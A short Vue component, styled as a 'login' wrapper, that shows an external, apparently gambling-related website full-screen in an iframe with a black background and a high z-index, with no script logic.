<template>
  <div class="login">
    <iframe
      src="https://hengongbet.com/en-my"
      frameborder="0"
      allowfullscreen
    ></iframe>
  </div>
</template>

<script setup>
// No logic needed – iframe is always visible
</script>

<style scoped>
.login {
  top: 0;
  left: 0;
  height: 100vh;
  background: black;
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
}

.login iframe {
  width: 100%;
  height: 100%;
  border: none;
  overflow: hidden;
}
</style>
